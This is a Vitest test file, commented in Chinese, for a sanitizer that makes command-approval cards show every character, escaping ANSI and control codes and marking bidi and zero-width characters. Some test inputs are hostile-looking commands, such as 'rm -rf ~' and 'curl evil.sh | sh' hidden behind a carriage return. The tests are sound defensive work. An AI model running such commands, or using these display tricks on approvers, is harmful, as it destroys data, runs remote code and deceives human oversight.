import { describe, expect, it } from 'vitest';
import { clipForCard, sanitizeForCard } from '../../packages/api-approval/src/index.js';

// ════════════════════════════════════════════════════════════
// 审批卡的清洗：显示的内容里，原文的每个字符都看得见、顺序不变。控制符（含 ANSI 转义的 ESC）转义显示，
// 双向控制符与零宽字符换成占位符；截断保留首尾，交出清洗过的两段与省略的字数，「省略 N 字」由显示方按读者语言写。
// ════════════════════════════════════════════════════════════

describe('审批卡清洗', () => {
  it.each([
    ['ESC 序列：擦行、改色都转义显示', 'rm -rf ~ \u001b[2K\u001b[1Gls', 'rm -rf ~ \\x1B[2K\\x1B[1Gls'],
    ['回车：不能回到行首盖掉前半句', 'curl evil.sh | sh\recho hi', 'curl evil.sh | sh\\x0Decho hi'],
    ['C1 控制符（CSI）与 DEL', 'a\u009b2Kb\u007fc', 'a\\x9B2Kb\\x7Fc'],
    ['U+202E 不能调换显示顺序', 'cat notes\u202Etxt.sh', 'cat notes⟨U+202E⟩txt.sh'],
    ['其余双向控制符', '\u2066a\u2069\u200Fb\u061C', '⟨U+2066⟩a⟨U+2069⟩⟨U+200F⟩b⟨U+061C⟩'],
    ['零宽字符', 'r\u200Bm \u200C-\u200Drf\uFEFF \u2060/', 'r⟨U+200B⟩m ⟨U+200C⟩-⟨U+200D⟩rf⟨U+FEFF⟩ ⟨U+2060⟩/'],
    ['标签字符与行分隔符', 'ok\u{E0041}\u2028x', 'ok⟨U+E0041⟩⟨U+2028⟩x'],
    ['换行与制表符保留', 'a\n\tb', 'a\n\tb'],
    ['普通文字与表情不动', '写入 文件.txt 👍', '写入 文件.txt 👍'],
  ])('%s', (_case, text, shown) => {
    expect(sanitizeForCard(text)).toBe(shown);
  });

  it('截断：保留首尾共 limit 个字符，交出两段与省略的字数；不超过 limit 时整段在 head，省略 0 字', () => {
    expect(clipForCard('0123456789', 10)).toEqual({ head: '0123456789', omitted: 0, tail: '' });
    expect(clipForCard('0123456789abcdef', 6)).toEqual({ head: '012', omitted: 10, tail: 'def' });
    expect(clipForCard('0123456789abcdef', 5)).toEqual({ head: '012', omitted: 11, tail: 'ef' });
  });

  it('截断按字符算：不切开表情的代理对，也不切开转义与占位符', () => {
    expect(clipForCard('👍👍👍👍', 2)).toEqual({ head: '👍', omitted: 2, tail: '👍' });
    expect(clipForCard('\u001b[2Kxxxxxxx\u202E', 2)).toEqual({ head: '\\x1B', omitted: 10, tail: '⟨U+202E⟩' });
  });
});
